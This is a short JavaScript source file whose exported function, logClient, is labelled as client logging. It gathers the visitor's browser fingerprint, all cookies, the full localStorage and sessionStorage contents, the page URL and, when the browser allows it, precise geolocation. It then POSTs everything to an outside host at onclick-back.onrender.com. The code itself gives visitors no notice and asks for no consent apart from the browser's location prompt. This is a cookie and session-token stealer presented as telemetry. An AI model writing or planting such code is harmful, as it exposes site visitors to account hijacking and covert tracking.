export async function logClient() {
  const payload = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    deviceMemory: navigator.deviceMemory || "N/A",
    screen: {
      width: screen.width,
      height: screen.height,
      pixelDepth: screen.pixelDepth,
    },
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    locationHref: location.href,
    timestamp: new Date().toISOString(),
  };

  // Геолокация (необязательно)
  try {
    await new Promise((resolve) =>
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          payload.geo = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          };
          resolve();
        },
        () => resolve(), // отказ — не критично
        { timeout: 1500 }
      )
    );
  } catch {}

  try {
    await fetch("https://onclick-back.onrender.com/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    console.info("✅ Client log sent");
  } catch (err) {
    console.warn("⚠️ Failed to send log:", err);
  }
}
